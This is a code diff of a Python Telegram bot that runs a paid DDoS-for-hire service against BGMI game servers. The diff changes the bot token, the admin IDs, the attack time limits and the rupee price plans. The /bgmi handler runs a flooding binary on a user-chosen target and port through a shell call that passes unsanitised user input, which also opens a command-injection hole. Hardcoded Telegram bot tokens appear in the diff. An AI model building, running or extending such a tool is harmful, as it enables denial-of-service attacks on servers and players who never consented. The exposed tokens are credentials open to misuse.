@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7202532685:AAGLATO-6cAbJUVHZL-6UFTtfzuLnWqgZPw')
+bot = telebot.TeleBot('7223592524:AAEnoHb8qMGA97jxLz31cxFyqGylerlbnxU')
 
 # Admin user IDs
-admin_id = {"1283324622", "6406776405", "1600832237"}
+admin_id = {"2111548216", "6682104026", "1048241028"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -204,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@HACKERSPLOIT_TG"
+    response = f"🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@Psycho_Assistant"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -232,15 +232,15 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 501:
-                response = "Error: Time interval must be less than 80."
+            if time > 240:
+                response = "Error: Time interval must be less than 240."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@HACKERSPLOIT_TG"
+                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@psycho_modz"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -273,7 +273,7 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''🤖 Available commands:
+    help_text ='''🤖 @psycho_modz Available commands:
 💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
@@ -317,14 +317,14 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
+-> Attack Time : 240 (S)
 > After Attack Limit : 5 Min
--> Concurrents Attack : 3
+-> Concurrents Attack : 300
 
 Pr-ice List💸 :
-Day-->100 Rs
-Week-->400 Rs
-Month-->800 Rs
+Day-->150 Rs
+Week-->600 Rs
+Month-->1500 Rs
 '''
     bot.reply_to(message, response)
 
